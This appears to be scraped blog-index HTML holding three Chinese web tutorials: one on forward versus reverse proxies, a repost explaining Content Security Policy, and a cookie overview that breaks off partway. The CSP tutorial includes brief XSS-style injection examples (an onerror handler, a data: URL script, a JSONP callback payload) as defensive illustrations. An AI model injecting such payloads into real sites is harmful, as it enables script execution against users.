&lt;p&gt;HTTP 的代理服务器既是 Web 服务器又是 Web 客户端。HTTP 客户端会向代理发送请求报文，代理服务器必须像 Web 服务器一样，正确地处理请求和连接，然后返回响应。同时，代理自身要向服务器发送请求，这样，其行为就必须像正确的 HTTP 客户端一样，要发送请求并接收响应。如果要创建自己的 HTTP 代理，就要认真地遵循为 HTTP 客户端和 HTTP 服务器制定的规则。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628347950236.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;类比学习&#34;&gt;类比学习&lt;/h2&gt;
&lt;h3 id=&#34;点餐&#34;&gt;点餐&lt;/h3&gt;
&lt;h4 id=&#34;没有代理&#34;&gt;没有代理&lt;/h4&gt;
&lt;p&gt;假如餐厅是厨师自己开的，厨师自己做饭提供给客户，我们下单，然后厨师把饭提供给我们。&lt;/p&gt;
&lt;p&gt;我们是客户端，厨师是服务端，没有代理&lt;/p&gt;
&lt;h4 id=&#34;正向代理&#34;&gt;正向代理&lt;/h4&gt;
&lt;p&gt;假如餐厅中有一名厨师，和一名服务员，我们下单告诉服务员，服务员告诉厨师，厨师做好饭后交给服务员，服务员端给我们。&lt;/p&gt;
&lt;p&gt;我们是客户端，服务员是正向代理，厨师是服务端。&lt;/p&gt;
&lt;p&gt;在这个过程中，服务员代替我们去告诉厨师想要吃的饭，厨师只知道服务员，并不知道最终吃饭的人是谁。&lt;/p&gt;
&lt;h4 id=&#34;反向代理&#34;&gt;反向代理&lt;/h4&gt;
&lt;p&gt;假如餐厅中有一名服务员，下单系统，和多名厨师，我们下单告诉服务员，服务员在下单系统上提交菜品，下单系统按照忙闲情况分配了厨师。&lt;/p&gt;
&lt;p&gt;我们是客户端，服务员是正向代理，下单系统是反向代理，厨师是服务端&lt;/p&gt;
&lt;p&gt;在这个过程中，我们只知道是在下单系统上提交的订单，但是不知道是哪位厨师提供的&lt;/p&gt;
&lt;h3 id=&#34;借钱&#34;&gt;借钱&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;假设由A、B和C三人，他们之间存在借钱的关系。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;正向代理-2&#34;&gt;正向代理&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;A需要钱，A知道C由很多钱，想向C借钱&lt;/li&gt;
&lt;li&gt;但是A和C有矛盾，于是A想到通过B去借C借钱&lt;/li&gt;
&lt;li&gt;B向C借到钱了，C不知道是A的存在&lt;/li&gt;
&lt;li&gt;这样B就帮助A借到了Z的钱&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在这个过程，B就充当了代理借钱的角色，并且是代替A去借钱的，这样就是正向代理。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348139202.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;反向代理-2&#34;&gt;反向代理&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;A需要钱，C有很多钱，A不知道C很多钱&lt;/li&gt;
&lt;li&gt;A找B借钱&lt;/li&gt;
&lt;li&gt;B知道C有很多钱&lt;/li&gt;
&lt;li&gt;B向C借钱，并把借到的钱给A，而没有使用自己的钱借给A&lt;/li&gt;
&lt;li&gt;A拿到钱以后，以为钱是B的，A不知道C的存在&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在这个过程当中，B也充当了代理借钱的角色，不过这次不是代替A去借的，而是用C的钱借给A的，换言之即是代替C将钱借给了A，这就是反向代理。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348150291.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
&lt;p&gt;正向代理: 买票的黄牛&lt;/p&gt;
&lt;p&gt;反向代理: 租房的代理&lt;/p&gt;
&lt;h2 id=&#34;正向代理-3&#34;&gt;正向代理&lt;/h2&gt;
&lt;p&gt;是指是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容， 客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348113934.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;特点&#34;&gt;特点&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;代理客户;&lt;/li&gt;
&lt;li&gt;隐藏真实的客户，为客户端收发请求，使真实客户端对服务器不可见;&lt;/li&gt;
&lt;li&gt;一个局域网内的所有用户可能被一台服务器做了正向代理，由该台服务器负责 HTTP 请求;&lt;/li&gt;
&lt;li&gt;意味着同服务器做通信的是正向代理服务器;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;作用&#34;&gt;作用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;访问原来无法访问的资源，如google&lt;/li&gt;
&lt;li&gt;可以做缓存，加速访问资源&lt;/li&gt;
&lt;li&gt;对客户端访问授权，上网进行认证&lt;/li&gt;
&lt;li&gt;代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348191475.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;反向代理-3&#34;&gt;反向代理&lt;/h2&gt;
&lt;p&gt;是指以代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348098770.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;特点-2&#34;&gt;特点&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;代理服务器;&lt;/li&gt;
&lt;li&gt;隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见;&lt;/li&gt;
&lt;li&gt;负载均衡服务器，将用户的请求分发到空闲的服务器上;&lt;/li&gt;
&lt;li&gt;意味着用户和负载均衡服务器直接通信，即用户解析服务器域名时得到的是负载均衡服务器的 IP ;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;作用-2&#34;&gt;作用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击&lt;/li&gt;
&lt;li&gt;负载均衡，通过反向代理服务器来优化网站的负载&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348224249.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348235535.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;h3 id=&#34;共同点&#34;&gt;共同点&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;都是做为服务器和客户端的中间层&lt;/li&gt;
&lt;li&gt;都可以加强内网的安全性，阻止 web 攻击&lt;/li&gt;
&lt;li&gt;都可以做缓存机制，提高访问速度&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;区别&#34;&gt;区别&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;正向代理其实是客户端的代理,反向代理则是服务器的代理。&lt;/li&gt;
&lt;li&gt;正向代理中，服务器并不知道真正的客户端到底是谁；而在反向代理中，客户端也不知道真正的服务器是谁。&lt;/li&gt;
&lt;li&gt;作用不同。正向代理主要是用来解决访问限制问题；而反向代理则是提供负载均衡、安全防护等作用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;图解&#34;&gt;图解&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348020634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628348030926.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/U5N4okQin9CJ4Bbl6U2EDA&#34;&gt;如何向老板解释反向代理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/question/24723688/answer/583903276&#34;&gt;知乎-慕课网&lt;/a&gt;&lt;/p&gt;
">77-http-27-正向代理和反向代理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-content-security-policy/"" data-c="
          &lt;h1 id=&#34;http-content-security-policy&#34;&gt;http-Content-Security-Policy&lt;/h1&gt;
&lt;h2 id=&#34;一-简介&#34;&gt;一、简介&lt;/h2&gt;
&lt;p&gt;CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。&lt;/p&gt;
&lt;p&gt;CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。&lt;/p&gt;
&lt;p&gt;两种方法可以启用 CSP。一种是通过 HTTP 头信息的&lt;code&gt;Content-Security-Policy&lt;/code&gt;的字段。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;
style-src cdn.example.org third-party.org; child-src https:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种是通过网页的&lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt;标签。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，CSP 做了如下配置。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;脚本：只信任当前域名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;标签：不信任任何URL，即不加载任何资源&lt;/li&gt;
&lt;li&gt;样式表：只信任&lt;code&gt;cdn.example.org&lt;/code&gt;和&lt;code&gt;third-party.org&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;框架（frame）：必须使用HTTPS协议加载&lt;/li&gt;
&lt;li&gt;其他资源：没有限制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;启用后，不符合 CSP 的外部资源就会被阻止加载。&lt;/p&gt;
&lt;h2 id=&#34;二-限制选项&#34;&gt;二、限制选项&lt;/h2&gt;
&lt;p&gt;CSP 提供了很多限制选项，涉及安全的各个方面。&lt;/p&gt;
&lt;h3 id=&#34;资源加载限制&#34;&gt;资源加载限制&lt;/h3&gt;
&lt;p&gt;以下选项限制各类资源的加载。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;script-src&lt;/code&gt;：外部脚本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;style-src&lt;/code&gt;：样式表&lt;/li&gt;
&lt;li&gt;&lt;code&gt;img-src&lt;/code&gt;：图像&lt;/li&gt;
&lt;li&gt;&lt;code&gt;media-src&lt;/code&gt;：媒体文件（音频和视频）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;font-src&lt;/code&gt;：字体文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;object-src&lt;/code&gt;：插件（比如 Flash）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;child-src&lt;/code&gt;：框架&lt;/li&gt;
&lt;li&gt;&lt;code&gt;frame-ancestors&lt;/code&gt;：嵌入的外部资源（比如&lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connect-src&lt;/code&gt;：HTTP 连接（通过 XHR、WebSockets、EventSource等）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;worker-src&lt;/code&gt;：&lt;code&gt;worker&lt;/code&gt;脚本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;manifest-src&lt;/code&gt;：manifest 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;default-src&#34;&gt;default-src&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;default-src&lt;/code&gt;用来设置上面各个选项的默认值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: default-src &#39;self&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码限制所有的外部资源，都只能从当前域名加载。&lt;/p&gt;
&lt;p&gt;如果同时设置某个单项限制（比如&lt;code&gt;font-src&lt;/code&gt;）和&lt;code&gt;default-src&lt;/code&gt;，前者会覆盖后者，即字体文件会采用&lt;code&gt;font-src&lt;/code&gt;的值，其他资源依然采用&lt;code&gt;default-src&lt;/code&gt;的值。&lt;/p&gt;
&lt;h3 id=&#34;url-限制&#34;&gt;URL 限制&lt;/h3&gt;
&lt;p&gt;有时，网页会跟其他 URL 发生联系，这时也可以加以限制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;frame-ancestors&lt;/code&gt;：限制嵌入框架的网页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;base-uri&lt;/code&gt;：限制&lt;code&gt;&amp;lt;base#href&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;form-action&lt;/code&gt;：限制&lt;code&gt;&amp;lt;form#action&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他限制&#34;&gt;其他限制&lt;/h3&gt;
&lt;p&gt;其他一些安全相关的功能，也放在了 CSP 里面。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;block-all-mixed-content&lt;/code&gt;：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;upgrade-insecure-requests&lt;/code&gt;：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议&lt;/li&gt;
&lt;li&gt;&lt;code&gt;plugin-types&lt;/code&gt;：限制可以使用的插件格式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sandbox&lt;/code&gt;：浏览器行为的限制，比如不能有弹出窗口等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;report-uri&#34;&gt;report-uri&lt;/h3&gt;
&lt;p&gt;有时，我们不仅希望防止 XSS，还希望记录此类行为。&lt;code&gt;report-uri&lt;/code&gt;就用来告诉浏览器，应该把注入行为报告给哪个网址。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: default-src &#39;self&#39;; ...; report-uri /my_amazing_csp_report_parser;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码指定，将注入行为报告给&lt;code&gt;/my_amazing_csp_report_parser&lt;/code&gt;这个 URL。&lt;/p&gt;
&lt;p&gt;浏览器会使用&lt;code&gt;POST&lt;/code&gt;方法，发送一个JSON对象，下面是一个例子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
    &amp;quot;csp-report&amp;quot;: {
     &amp;quot;document-uri&amp;quot;: &amp;quot;http://example.org/page.html&amp;quot;,
     &amp;quot;referrer&amp;quot;: &amp;quot;http://evil.example.com/&amp;quot;,
     &amp;quot;blocked-uri&amp;quot;: &amp;quot;http://evil.example.com/evil.js&amp;quot;,
     &amp;quot;violated-directive&amp;quot;: &amp;quot;script-src &#39;self&#39; https://apis.google.com&amp;quot;,
     &amp;quot;original-policy&amp;quot;: &amp;quot;script-src &#39;self&#39; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&amp;quot;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;三-content-security-policy-report-only&#34;&gt;三、Content-Security-Policy-Report-Only&lt;/h2&gt;
&lt;p&gt;除了&lt;code&gt;Content-Security-Policy&lt;/code&gt;，还有一个&lt;code&gt;Content-Security-Policy-Report-Only&lt;/code&gt;字段，表示不执行限制选项，只是记录违反限制的行为。&lt;/p&gt;
&lt;p&gt;它必须与&lt;code&gt;report-uri&lt;/code&gt;选项配合使用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy-Report-Only: default-src &#39;self&#39;; ...; report-uri /my_amazing_csp_report_parser;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;四-选项值&#34;&gt;四、选项值&lt;/h2&gt;
&lt;p&gt;每个限制选项可以设置以下几种值，这些值就构成了白名单。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机名：&lt;code&gt;example.org&lt;/code&gt;，&lt;code&gt;https://example.com:443&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;路径名：&lt;code&gt;example.org/resources/js/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;通配符：&lt;code&gt;*.example.org&lt;/code&gt;，&lt;code&gt;*://*.example.com:*&lt;/code&gt;（表示任意协议、任意子域名、任意端口）&lt;/li&gt;
&lt;li&gt;协议名：&lt;code&gt;https:&lt;/code&gt;、&lt;code&gt;data:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;关键字&lt;code&gt;&#39;self&#39;&lt;/code&gt;：当前域名，需要加引号&lt;/li&gt;
&lt;li&gt;关键字&lt;code&gt;&#39;none&#39;&lt;/code&gt;：禁止加载任何外部资源，需要加引号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;多个值也可以并列，用空格分隔。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: script-src &#39;self&#39; https://apis.google.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果同一个限制选项使用多次，只有第一次会生效。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;# 错误的写法
script-src https://host1.com; script-src https://host2.com

# 正确的写法
script-src https://host1.com https://host2.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果不设置某个限制选项，就是默认允许任何值。&lt;/p&gt;
&lt;h2 id=&#34;五-script-src-的特殊值&#34;&gt;五、script-src 的特殊值&lt;/h2&gt;
&lt;p&gt;除了常规值，&lt;code&gt;script-src&lt;/code&gt;还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;unsafe-inline&#39;&lt;/code&gt;：允许执行页面内嵌的&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签和事件监听函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-eval&lt;/code&gt;：允许将字符串当作代码执行，比如使用&lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;setTimeout&lt;/code&gt;、&lt;code&gt;setInterval&lt;/code&gt;和&lt;code&gt;Function&lt;/code&gt;等函数。&lt;/li&gt;
&lt;li&gt;nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行&lt;/li&gt;
&lt;li&gt;hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面内嵌脚本，必须有这个token才能执行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&amp;gt;
// some code
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;hash值的例子如下，服务器给出一个允许执行的代码的hash值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Security-Policy: script-src &#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面的代码就会允许执行，因为hash值相符。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;alert(&#39;Hello, world.&#39;);&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意，计算hash值的时候，&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签不算在内。&lt;/p&gt;
&lt;p&gt;除了&lt;code&gt;script-src&lt;/code&gt;选项，nonce值和hash值还可以用在&lt;code&gt;style-src&lt;/code&gt;选项，控制页面内嵌的样式表。&lt;/p&gt;
&lt;h2 id=&#34;六-注意点&#34;&gt;六、注意点&lt;/h2&gt;
&lt;p&gt;（1）&lt;code&gt;script-src&lt;/code&gt;和&lt;code&gt;object-src&lt;/code&gt;是必设的，除非设置了&lt;code&gt;default-src&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;因为攻击者只要能注入脚本，其他限制都可以规避。而&lt;code&gt;object-src&lt;/code&gt;必设是因为 Flash 里面可以执行外部脚本。&lt;/p&gt;
&lt;p&gt;（2）&lt;code&gt;script-src&lt;/code&gt;不能使用&lt;code&gt;unsafe-inline&lt;/code&gt;关键字（除非伴随一个nonce值），也不能允许设置&lt;code&gt;data:&lt;/code&gt;URL。&lt;/p&gt;
&lt;p&gt;下面是两个恶意攻击的例子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;img src=&amp;quot;x&amp;quot; onerror=&amp;quot;evil()&amp;quot;&amp;gt;
&amp;lt;script src=&amp;quot;data:text/javascript,evil()&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（3）必须特别注意 JSONP 的回调函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script
src=&amp;quot;/path/jsonp?callback=alert(document.domain)//&amp;quot;&amp;gt;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/09/csp.html&#34;&gt;https://www.ruanyifeng.com/blog/2016/09/csp.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;文档&#34;&gt;文档&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy&#34;&gt;MDN/HTTP/Headers/Content-Security-Policy&lt;/a&gt;&lt;/p&gt;
">76-http-26-Content Security Policy</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-cookie/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。&lt;/p&gt;
&lt;p&gt;Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对话（session）管理：保存登录、购物车等需要记录的信息。&lt;/li&gt;
&lt;li&gt;个性化：保存用户的偏好，比如网页的字体大小、背景色等等。&lt;/li&gt;
&lt;li&gt;追踪：记录和分析用户行为。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。&lt;/p&gt;
&lt;p&gt;Cookie 包含以下几方面的信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cookie 的名字&lt;/li&gt;
&lt;li&gt;Cookie 的值（真正的数据写在这里面）&lt;/li&gt;
&lt;li&gt;到期时间&lt;/li&gt;
&lt;li&gt;所属域名（默认是当前域名）&lt;/li&gt;
&lt;li&gt;生效的路径（默认是当前网址）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例来说，用户访问网址&lt;code&gt;www.example.com&lt;/code&gt;，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含&lt;code&gt;www.example.com&lt;/code&gt;这个域名，以及根路径&lt;code&gt;/&lt;/code&gt;。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为&lt;code&gt;/forums&lt;/code&gt;，那么这个 Cookie 只有在访问&lt;code&gt;www.example.com/forums&lt;/code&gt;及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。&lt;/p&gt;
&lt;p&gt;浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。&lt;code&gt;window.navigator.cookieEnabled&lt;/code&gt;属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;document.cookie&lt;/code&gt;属性返回当前网页的 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 当前网页的 Cookie
document.cookie
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。&lt;/p&gt;
&lt;p&gt;浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，&lt;code&gt;http://example.com&lt;/code&gt;设置的 Cookie，可以被&lt;code&gt;https://example.com&lt;/code&gt;读取。&lt;/p&gt;
&lt;h2 id=&#34;来源&#34;&gt;来源&lt;/h2&gt;
&lt;p&gt;HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。&lt;/p&gt;
&lt;p&gt;使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。&lt;/p&gt;
&lt;p&gt;可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。&lt;/p&gt;
&lt;p&gt;HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cookie 的本职工作并非本地存储，而是“维持状态”&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cookie是服务端生成，客户端进行维护和存储&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个Set-Cookie选项，将cookie放入到响应请求中，在浏览器第二次发请求的时候，会通过Cookie请求头部将Cookie信息发送给服务器，服务端会辨别用户身份，另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。&lt;/p&gt;
